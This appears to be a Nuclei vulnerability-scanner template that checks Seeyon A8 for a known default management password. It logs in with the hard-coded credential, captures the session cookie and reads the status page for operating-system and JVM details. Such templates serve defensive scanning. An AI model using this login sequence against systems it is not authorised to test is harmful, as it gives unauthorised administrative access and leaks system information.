id: seeyon-a8-management-default-password
info:
  name: Seeyon A8 Management Default Password Information Leak
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password, info-leak
http:
  - raw:
      - |
        POST /seeyon/management/index.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        password=WLCCYBD%40SEEYON
    extractors:
      - type: regex
        name: session_cookie
        part: header
        internal: true
        regex:
          - "JSESSIONID=(.*?);"
    matchers:
      - type: status
        status:
          - 302
      - type: word
        part: header
        words:
          - "/seeyon/management/status.jsp"
  - raw:
      - |
        GET /seeyon/management/status.jsp HTTP/1.1
        Host: {{Hostname}}
        Cookie: JSESSIONID={{session_cookie}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "OS Name"
          - "JVM Version"
          - "Processors"
